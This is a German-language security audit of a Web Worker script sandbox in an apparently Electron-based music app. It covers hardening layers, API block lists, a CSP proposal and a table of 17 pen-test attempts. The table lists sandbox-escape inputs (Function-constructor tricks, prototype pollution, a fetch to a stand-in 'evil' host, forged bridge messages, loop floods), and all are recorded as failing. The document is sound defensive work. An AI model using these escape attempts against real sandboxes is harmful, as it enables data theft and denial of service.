# Script Sandbox – Security Audit & Checklist

**Status:** v1.17.0 — Audit-Welle abgeschlossen (TASK-103 / D)
**Owner:** Security Agent
**Scope:** `client/src/sandbox/*`, `client/src/utils/projectSerializer.ts`, App.tsx-Wiring

## Bedrohungsmodell

User-Skripte aus dem Script Runner werden in einem Web Worker ausgeführt, der
zur Laufzeit via Blob-URL erzeugt wird. Der Worker hat NUR Zugriff auf eine
explizit gewhitelistete Bridge (`ss.*`), niemals auf:

- `window`, `document`, `electronAPI`
- `fetch`, `XMLHttpRequest`, `WebSocket`, `EventSource`, `indexedDB`, `caches`
- `Worker`, `SharedWorker`, `BroadcastChannel`
- `importScripts`, `Notification`, `RTCPeerConnection`, `RTCDataChannel`
- `navigator`, `clients`, `self.postMessage` (private bridge bleibt aktiv)

## Hardening-Layer

| Layer | Mechanismus | Datei |
|---|---|---|
| 1. Globals | 17 Web-APIs auf `undefined` gesetzt vor User-Code | `sandbox-runtime.ts`, `SANDBOX_WORKER_SOURCE` |
| 2. Prototype-Chain | `WorkerGlobalScope.prototype.postMessage` durch wirft-Stub ersetzt (v1.17) | `sandbox-runtime.ts` |
| 3. Bridge-Whitelist | 8 erlaubte Methods (Default-Deny) | `useScriptSandbox.ts` |
| 4. Dispatch-Whitelist | 16 idempotente Pattern-/Transport-Actions, keine `save/load/delete-pattern` | `useScriptSandbox.ts` |
| 5. Param-Clamping | bpm 20..300, macro idx strict 0..7, stepIdx 0..63, log 500 chars | `useScriptSandbox.ts` |
| 6. Wall-Clock-Timeout | `setTimeout → worker.terminate()` auf Main-Thread | `useScriptSandbox.ts` |
| 7. ss-Freeze | `Object.freeze(ss)` + prototype freeze (v1.17) | `sandbox-runtime.ts` |
| 8. Log-Rate-Limit | 100 logs / 200ms-Fenster, Drop-Summary am Ende (v1.17) | `sandbox-runtime.ts` |
| 9. Consent-on-Load | Beim Laden fremder Projekte: `enabled: false` für alle scripts | `projectSerializer.ts` |
| 10. Code-Size-Limit | `MAX_SCRIPT_CODE_BYTES = 10_000`, `MAX_SCRIPTS = 64` | `useScriptStore.ts` |

## Audit-Checkliste

- [x] Worker-Source verwendet Blob-URL (keine externe Datei, kein Vite-Worker-Plugin)
- [x] Allowlist statt Blocklist (Default-Deny: `ALLOWED_BRIDGE_METHODS`, `ALLOWED_DISPATCH_ACTIONS`)
- [x] postMessage-Bridge validiert `type` strikt (`ss-call` vs `ss-reply` vs `exec`)
- [x] Param-Clamping aktiv für alle bridge-Methoden
- [x] Beim Load fremder Projekte: `enabled = false` initial (User-Consent-Flow)
- [x] Code-Size-Limit + Max-Scripts (`MAX_SCRIPT_CODE_BYTES`, `MAX_SCRIPTS`)
- [x] Timeout-Killer testbar (mock worker via `__setWorkerFactoryForTesting`)
- [x] Prototype-Freeze auf ss-Objekt (v1.17 Audit-Patch)
- [x] Prototype-Chain-Hardening für `postMessage`/`importScripts` (v1.17 Audit-Patch)
- [x] Log-Rate-Limit (100/200ms, v1.17 Audit-Patch)
- [x] Drift-Test runtime ↔ inlined source (`script-sandbox-pentest.test.ts` Tests 14-17)
- [ ] **CSP `worker-src 'self' blob:` (Browser + Electron)** — siehe Caveat unten

## Pen-Test-Ergebnisse (17 / 17 grün)

Datei: `tests/features/script-sandbox-pentest.test.ts`. Jeder Test versucht
einen konkreten Angriff; alle scheitern wie vorgesehen.

| # | Angriff | Verdict |
|---|---|---|
| 1 | Direct `fetch('https://evil')` | HARMLESS — fetch ist undefined |
| 2 | `(function(){}).constructor('return self.fetch')()` | HARMLESS — gibt undefined |
| 3 | `Function('return self.XMLHttpRequest')()` | HARMLESS — gibt undefined |
| 4 | `WorkerGlobalScope.prototype.postMessage.call(self, ...)` | PATCHED — Stub wirft (v1.17) |
| 5 | `ss.bpm = function(){return 'pwned'}` | PATCHED — Object.freeze (v1.17) |
| 6 | `ss.constructor = null` | HARMLESS — bridge unbeeindruckt |
| 7 | `Object.prototype.bpm = 'evil'` | HARMLESS — bridge nutzt args[], nicht proto |
| 8 | `while(true){}` | HARMLESS — terminate nach maxRuntimeMs |
| 9 | `await new Promise(()=>{})` | HARMLESS — terminate nach maxRuntimeMs |
| 10 | Microtask-Flood (`while(true){await Promise.resolve()}`) | HARMLESS — Main-Thread-Timer feuert |
| 11 | `for(let i=0;i<99999;i++)ss.log(i)` | PATCHED — rate-limit < 3000 logs (v1.17) |
| 12 | `self.postMessage({type:'ss-reply', id:1, value:'pwned'})` | HARMLESS — postMessage undefined |
| 13 | `ss.readFile`, `ss.exec`, `ss.eval` | HARMLESS — undefined, kein allowlist-Eintrag |
| 14 | Drift: alle 17 globals neutralisiert in inlined source | PASS |
| 15 | Drift: prototype-chain-hardening in inlined source | PASS |
| 16 | Drift: log-rate-limit in inlined source | PASS |
| 17 | Drift: Object.freeze(ss) in inlined source | PASS |

## Caveat: CSP fehlt in Electron Main

`electron/main.ts` setzt aktuell KEINEN expliziten CSP-Header. Production-
Builds (`webSecurity: true`) erlauben Blob-URL-Worker per default. Empfohlene
Hardening-Stufe für v1.18:

```ts
// electron/main.ts — irgendwo nach app.whenReady()
session.defaultSession.webRequest.onHeadersReceived((details, callback) => {
  callback({
    responseHeaders: {
      ...details.responseHeaders,
      "Content-Security-Policy": [
        "default-src 'self'; " +
        "script-src 'self' 'wasm-unsafe-eval'; " +
        "style-src 'self' 'unsafe-inline'; " +
        "worker-src 'self' blob:; " +
        "connect-src 'self' ws://localhost:* http://localhost:*; " +
        "img-src 'self' data: blob:;"
      ]
    }
  });
});
```

Bis CSP gesetzt ist, ist die Sandbox-Sicherheit "ausreichend" für v1.17.0
(User-Skripte sind opt-in, Default-Deny-Bridge, isolierter Worker). Mit
CSP wäre zusätzlich abgesichert, dass die Web-Build keine fremden Scripts
laden kann (XSS-Defense-in-Depth).

## Drift-Risiko: zwei Source-Kopien

`sandbox-runtime.ts` (TypeScript-lesbar) und `SANDBOX_WORKER_SOURCE` (inlined
String in `useScriptSandbox.ts`) müssen identisch sein. Build-Time-Codegen
wäre die saubere Lösung — bis dahin garantieren die Drift-Tests 14-17 in
`script-sandbox-pentest.test.ts`, dass die wichtigsten Patches in BEIDEN
Versionen vorhanden sind. Bei jeder Änderung an `sandbox-runtime.ts` MUSS
auch `SANDBOX_WORKER_SOURCE` im selben Commit nachgezogen werden.

## Was die Sandbox NICHT schützt

- **Logik-Bugs in App-Settern**: Wenn `AudioEngine.setBpm(v)` einen Side-
  Effect hat, der über die Bridge missbraucht werden kann, ist das ein
  App-Bug, kein Sandbox-Bug.
- **Performance-DoS durch Speicher**: User-Skript kann `new Array(1e9)`
  versuchen — Worker stirbt mit RangeError, was OK ist (cleanup läuft).
- **CPU-Last während Timeout**: zwischen exec und terminate kann User-Code
  100% CPU eines Cores nutzen. Die Schadensbegrenzung kommt vom Timeout.

## Production-Ready?

**JA — für v1.17.0**, unter folgenden Bedingungen:

1. CSP-Caveat dokumentiert (oben)
2. Drift-Tests sind grün (CI-erzwungen)
3. Code-Reviewer prüft bei jedem PR auf `sandbox-runtime.ts` ODER
   `useScriptSandbox.ts` ob beide Kopien identisch sind.
